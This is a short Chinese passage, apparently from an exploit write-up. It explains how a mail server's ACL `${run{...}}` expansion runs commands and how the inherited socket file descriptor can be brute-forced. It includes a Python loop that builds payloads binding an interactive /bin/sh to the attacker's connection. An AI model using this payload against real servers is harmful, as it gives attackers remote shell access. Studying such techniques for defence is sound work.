例如当检测发送者地址时就会用到 `ACL`，通过 `ACL` 可用来执行命令，比如：`${run{command}}`。在 Linux 中，当一个进程创建子进程时，打开的文件描述符会被复制给子进程。因此每当 `ACL` 命令被执行时，`socket` 文件描述符会被子进程重新使用。因此这个很容易利用暴力方式来得到此描述符，并作为 `stdin` 来使用。

```python
for fd in range(3, 20):
    cmd += "${{run{{/bin/sh -c 'exec /bin/sh -i <&{0} >&0 2>&0'}}}} ".format(fd)
```
